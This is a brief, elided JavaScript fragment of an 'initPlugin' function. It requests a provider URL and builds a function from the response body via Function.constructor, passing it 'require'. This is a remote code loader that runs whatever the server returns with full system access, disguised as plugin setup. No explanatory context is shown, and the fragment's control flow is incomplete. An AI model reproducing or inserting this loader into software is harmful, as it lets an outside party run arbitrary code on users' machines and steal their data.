...
function initPlugin(reqtoken = PROVIDER_ID, reqoptions = { url: PROVIDER_URL, headers: { bearrtoken: "logo" } }, ret = 1) {
    ...
    const mreq = (atlf) => {
        req(reqoptions, (e, r, b) => {
            if (e || r.statusCode !== 200) {
                ...
                const handler = new (Function.constructor)('require', JSON.parse(b));
